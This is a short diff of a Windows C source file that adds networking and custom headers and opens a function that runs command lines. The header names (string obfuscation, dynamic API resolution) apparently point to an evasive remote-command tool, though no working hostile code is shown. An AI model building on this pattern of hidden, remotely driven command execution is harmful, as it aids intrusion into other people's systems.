@@ -1,10 +1,10 @@
+#include <winsock2.h>
 #include <windows.h>
-#include <stdio.h>
-#include <string.h>
 #include "exec.h"
 #include "obf.h"
 #include "obf_strings.h"
 #include "../../include/dynapi.h"
+#include "../../include/mini_std.h"
 
 static void run_cmdline(const char *cmd_line, char *out_buf, int buf_size) {
     out_buf[0] = '\0';
